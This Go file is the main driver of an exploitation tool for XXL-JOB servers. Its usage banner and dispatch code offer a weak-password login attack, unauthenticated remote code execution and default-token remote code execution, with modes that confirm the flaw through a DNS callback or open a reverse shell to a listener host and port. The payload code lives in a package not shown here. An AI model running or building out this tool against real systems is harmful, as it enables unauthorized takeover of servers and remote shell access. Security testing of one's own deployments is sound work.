package main

import (
	"fmt"
	"xxl-job/pocs"
	"xxl-job/tools"
)

func printUsage() {
	str := `+***************************************************************************************+
*        xxl-job related vulnerability detection and exploitation tools                 *
*                                                                                       *
*        week password:                                                                 *
*                    go run xxl-job.go week -u http://127.0.0.1                         *
*                                                                                       *
*        unauthoriztion rce:                                                            *
*                    go run xxl-job.go unauth -u http://127.0.0.1 -d dnslog.com         *
*                    go run xxl-job.go unauth -u http://127.0.0.1 -lh ip -lp port       *
*                                                                                       *
*        defult token rce:                                                              *
*                    go run xxl-job.go token -u http://127.0.0.1 -d dnslog.com          *
*                    go run xxl-job.go token -u http://127.0.0.1 -lh ip -lp port        *
*                                                                                       *
* -p proxy Optional parameters, choose whether to add according to the actual situation *
+***************************************************************************************+`
	fmt.Println(str)
}

func weekPasswordExploit(options *tools.Options) error {
	exp := pocs.NewWeekPassword(options.URL, options.Proxy)
	exp.Login()
	return nil
}

func unauthorizedEceExploit(options *tools.Options) error {
	exp := pocs.NewUnauthorizedRce(options.URL, options.Proxy)

	if options.Dnslog != "" && options.Lhost == "" && options.Lport == "" {
		exp.Check(options.Dnslog)
	} else if options.Dnslog == "" && options.Lhost != "" && options.Lport != "" {
		exp.ReveseShell(options.Lhost, options.Lport)
	} else {
		return fmt.Errorf("parameter input error, please refer to the following usage")
	}
	return nil
}

func accessTokenExploit(options *tools.Options) error {
	exp := pocs.NewAccessTokenRce(options.URL, options.Proxy)
	if options.Dnslog != "" && options.Lhost == "" && options.Lport == "" {
		exp.Check(options.Dnslog)
	} else if options.Dnslog == "" && options.Lhost != "" && options.Lport != "" {
		exp.ReveseShell(options.Lhost, options.Lport)
	} else {
		return fmt.Errorf("parameter input error, please refer to the following usage")
	}

	return nil
}

func exploit(options *tools.Options) error {
	// if options.URL == "" {
	// 	return fmt.Errorf("please provide the target URL")
	// }
	switch options.Name {
	case "week":
		return weekPasswordExploit(options)
	case "unauth":
		return unauthorizedEceExploit(options)
	case "token":
		return accessTokenExploit(options)
	case "help":
		return nil
	default:
		return fmt.Errorf("invalid operation options")
	}
}

func main() {
	printUsage()

	options, err := tools.GetCommandOptions()
	if err != nil {
		fmt.Println(err)
		return
	}

	err = exploit(options)
	if err != nil {
		fmt.Println(err)
		return
	}

	// 使用 opts 中的值进行操作
	// fmt.Printf("Operation Name: %s\nTarget URL: %s\nProxy: %s\nDNS Log: %s\nLocal Host: %s\nLocal Port: %s\n",
	// 	options.Name, options.URL, options.Proxy, options.Dnslog, options.Lhost, options.Lport)
}
